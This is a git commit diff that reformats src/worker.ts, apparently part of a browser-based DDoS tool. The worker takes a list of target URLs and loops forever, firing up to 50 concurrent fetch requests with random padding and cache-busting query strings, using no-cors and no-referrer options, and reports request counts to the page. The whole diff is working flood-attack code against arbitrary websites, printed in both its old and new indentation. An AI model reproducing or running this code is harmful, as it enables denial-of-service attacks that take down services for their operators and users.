7f20cae0f8e57406fb3d0d27e26f87b96066faa4
Denys Kashkovskyi <dannie.k@me.com>
2022-03-19 23:43:23 +0000

    Deployment scripts

--- src/worker.ts
+++ src/worker.ts
@@ -7,63 +7,62 @@ const CONCURRENCY = 50;
 const PAYLOAD_SIZE = 2_000;
 
 const sendRequest = async (target: string, timeout: number) => {
-  const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), timeout);
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), timeout);
 
-  try {
-    await fetch(target, {
-      mode: "no-cors",
-      cache: "no-store",
-      referrerPolicy: "no-referrer",
-      signal: controller.signal,
-    });
-
-    clearTimeout(timeoutId);
-  } catch (e) {
-    clearTimeout(timeoutId);
-  }
+    try {
+        await fetch(target, {
+            mode: "no-cors",
+            cache: "no-store",
+            referrerPolicy: "no-referrer",
+            signal: controller.signal,
+        });
+        clearTimeout(timeoutId);
+    } catch (e) {
+        clearTimeout(timeoutId);
+    }
 };
 
 self.addEventListener(
-  "message",
-  async (e: MessageEvent<{ type: string; threads: number; url: string }>) => {
-    if (e.data.type !== "init") return;
-    const targets = e.data.url
-      .split(",")
-      .map(
-        (target) => `https:${target.replace(/\s/, "").replace(/http(s?):/, "")}`
-      );
+    "message",
+    async (e: MessageEvent<{ type: string; threads: number; url: string }>) => {
+        if (e.data.type !== "init") return;
+        const targets = e.data.url
+            .split(",")
+            .map(
+                (target) => `https:${target.replace(/\s/, "").replace(/http(s?):/, "")}`
+            );
 
-    let nRequests = 0n;
-    let payload = generateRandomString(PAYLOAD_SIZE);
+        let nRequests = 0n;
+        let payload = generateRandomString(PAYLOAD_SIZE);
 
-    setInterval(() => {
-      payload = generateRandomString(PAYLOAD_SIZE + randomInt(100, 200)());
-      self.postMessage(nRequests);
-      nRequests = 0n;
-    }, REPORT_INTERVAL);
+        setInterval(() => {
+            payload = generateRandomString(PAYLOAD_SIZE + randomInt(100, 200)());
+            self.postMessage(nRequests);
+            nRequests = 0n;
+        }, REPORT_INTERVAL);
 
-    const queue = [];
+        const queue = [];
 
-    while (true) {
-      if (queue.length >= CONCURRENCY) {
-        await queue[0];
-        queue[0] = null;
-        queue.shift();
-        continue;
-      }
+        while (true) {
+            if (queue.length >= CONCURRENCY) {
+                await queue[0];
+                queue[0] = null;
+                queue.shift();
+                continue;
+            }
 
-      const timeoutRand = randomInt(50, 100)();
-      targets.forEach((target) => {
-        queue.push(
-          sendRequest(
-            `${target}?${payload.toString()}${Math.random()}`,
-            REQUEST_TIMEOUT_BASE + timeoutRand
-          )
-        );
-        nRequests++;
-      });
-    }
-  },
-  false
+            const timeoutRand = randomInt(50, 100)();
+            targets.forEach((target) => {
+                queue.push(
+                    sendRequest(
+                        `${target}?${payload.toString()}${Math.random()}`,
+                        REQUEST_TIMEOUT_BASE + timeoutRand
+                    )
+                );
+                nRequests++;
+            });
+        }
+    },
+    false
 );
